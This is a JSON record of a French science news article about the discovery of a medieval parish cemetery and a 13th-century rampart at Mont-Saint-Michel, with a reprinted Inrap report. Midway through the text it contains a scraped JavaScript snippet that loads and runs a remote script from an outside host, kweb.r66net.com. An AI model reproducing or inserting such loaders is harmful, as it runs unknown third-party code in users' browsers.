{"title": "Mont-Saint-Michel : un cimetiere du Moyen Age mis au jour", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-02-01", "content": "Le Mont-Saint-Michel est l'un des sites touristiques les plus visites en France. Pour les chercheurs, son histoire et celle des populations qui l'ont fait vivre gardent toujours une part de mystere. La decouverte recente d'un cimetiere datant du Moyen Age apporte neanmoins de nouveaux eclairages. En janvier 2017, au detour de travaux de refection de canalisations, des chercheurs de l'Institut national de recherches archeologiques preventives (Inrap) ont decouvert, sous la rue principale du Mont-Saint-Michel, un cimetiere paroissial datant du  Moyen Age . La fouille a permis de mettre au jour une quarantaine de  sepultures  dans des etats de conservation varies. Selon Elen Esnault, responsable de l'operation a l'Inrap, ce sont la les restes des  premiers habitants  du Mont-Saint-Michel qui ont ete retrouves. Car, en attendant une datation precise au carbone 14, qui devrait tomber debut 2018, les chercheurs estiment que ce cimetiere date d'avant le XIII e  siecle. Les premiers habitants du Mont-Saint-Michel se sont probablement installes sur le site au VIII e  siecle, au moment de la creation du tout premier lieu de culte sur le rocher. Les etudes a venir devraient permettre d'en savoir plus sur leur mode de vie. (c) Emmanuelle Collado, Inrap                               Des informations sur la morphologie du village Ces travaux apportent de nouveaux elements a propos du village, son evolution et sa morphologie.  << Nous l'imaginions plutot en hauteur et assez restreint, et finalement, il etait assez developpe >> , a raconte Elen Esnault a l'occasion d'une conference tenue ce weekend. Le  premier village  du Mont-Saint-Michel semble ainsi s'etre resserre au XIII e  siecle alors qu'il etait plus etendu a l'origine.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  << On peut imaginer que le village s'est resserre pour mieux se proteger, apres l'attaque des Bretons en 1204, au cours de laquelle il a ete incendie, et a probablement subi des destructions assez importantes. >>  Le rempart du XIII e  siecle a ensuite ete demonte pour etre reconstruit au XIV e  siecle sur son trace actuel, puis, a nouveau, le village s'est progressivement etendu. Avec AFP Pour en savoir plus Mont-Saint-Michel : decouverte d'un ancien cimetiere et d'une fortification medievale Les fouilles se poursuivent toujours sur la commune du Mont-Saint-Michel, a l'histoire longue et complexe, entre edifications, sieges militaires et fortifications. Apres une decennie d'etudes, entre 2005 et 2015, qui ont revele quelques episodes meconnus, ce sont des travaux d'intervention sur les reseaux dans la Grande rue, pres de l'eglise, qui ont, par surprise, exhume une fortification medievale et un cimetiere paroissial. Ils vont etre examines de pres. Article de l'Inrap paru le 01/02/2017 En 2005, une equipe de l' Inrap  avait mis au jour de nombreux moules en schiste destines a la fabrication d'enseignes de pelerinage, a l'emplacement d'un atelier de production date des XIV e  et XV e  siecles, pres de l'entree de l'abbaye du  Mont-Saint-Michel . La variete et la qualite de ces pieces en font aujourd'hui une collection de reference en archeologie medievale. En 2011, les archeologues ont revele les vestiges d'une tour des fortifications, la tour Denis, ouvrage edifie vers 1479 et detruit en 1732. En 2015, d'anciennes maisons, donnant sur la greve et detruites en 1368, ont ete etudiees. Dans l' abbaye , l'Inrap a suivi plusieurs chantiers de restauration conduits par l'architecte en chef des Monuments historiques dont les operations importantes menees sur la Merveille, sur l'ancienne Hotellerie de Robert de Torigny et sur les Logis abbatiaux. Aujourd'hui, la recherche des fortifications et de la  porte  du XIII e  siecle a permis la decouverte, inattendue, du cimetiere paroissial. Sous les pierres des batiments, des restes humains temoignent de la presence d'un cimetiere, dont les historiens connaissaient l'existence mais que l'on pensait perdu. (c) Emmanuelle Collado, Inrap                               D'anciennes fortifications reapparaissent... et revelent un cimetiere medieval Dans le cadre des travaux de refection des reseaux menes par la commune du Mont-Saint-Michel, les archeologues de l'Inrap recherchent aux abords de l'eglise paroissiale, la fortification du XIII e  siecle et la porte du village, mentionnes dans un texte du XV e  siecle :  << Ledit d'Estouville et les moynes les firent renforcer l'an 1425, auquel temps la porte de la ville fut changee, estant vis-a-vis de l'eglise paroissiale, elle fut mise la ou elle est a present >>  ( Le Roy , reed. Decaens, 2008). En 1204, les Bretons, allies de Philippe-Auguste, roi de France, font le siege du Mont-Saint-Michel et mettent le  feu  au village et a l'abbaye :  << le tout fut facile a faire aux Bretons, car la ville n'estoit point close de muraille mais de pallis de  bois  seulement >>  (meme source). En 1256, sous l'impulsion de l'abbe Richard Turstin, une nouvelle enceinte en pierre est edifiee. C'est cette enceinte, arasee depuis, que les  archeologues  pensent avoir decelee sous la forme d'une large tranchee de recuperation. Situee dans l'axe du rempart conserve au sud de la tour Nord, cette tranchee opere un retour a angle droit vers l'ouest, marquant une chicane qui pourrait indiquer l'emplacement de la porte. Mais les travaux ont egalement revele la presence du cimetiere paroissial, pense detruit par l'installation des reseaux en 1913. A l'origine, ce cimetiere s'etendait sur un rayon de 30 m environ autour de l'eglise. Au moment de l'edification de la muraille de Turstin, le village semble se retracter et une partie de ce cimetiere est abandonnee. Abimee, tronquee, bouleversee par les amenagements posterieurs, la trentaine de  sepultures  sauvegardees permet cependant aux anthropologues de recueillir de precieuses informations sur l'organisation des inhumations. Des  datations au carbone 14  et des etudes archeo-anthropologiques permettront une meilleure  datation  et la determination de l'age, du sexe et des eventuelles maladies ou  carences  des defunts. Ces donnees offriront ainsi un apercu de la population du village du Mont-Saint-Michel avant le XIII e  siecle. Par ailleurs, le cloitre de l'abbaye va faire l'objet de travaux visant a retrouver les niveaux d'origine des sols, exhausses lors d'une phase de restauration. La fouille et l'etude de bati menees a cette occasion documenteront l'etat initial du cloitre et ses eventuelles evolutions. Les etudes archeologiques menees au Mont-Saint-Michel par l'Inrap depuis 2001 abordent des aspects effleures par les etudes historiques. Touchant a la fois l'abbaye, le village et les fortifications, elles permettent de renouveler et preciser l'histoire riche et mouvementee du Mont. Archeologie : decouvrez le passionnant travail de l'anthropologue                       Lors de recherches archeologiques, il n'est pas rare de trouver d'anciens sites d'inhumation. Ces tombes renferment en general de nombreux indices et temoignages des civilisations passees que l'anthropologue saura interpreter precisement. L'Inrap (Institut national de recherches archeologiques preventives) nous parle de son travail au cours de cette courte video.                                       ", "theme": "sciences"}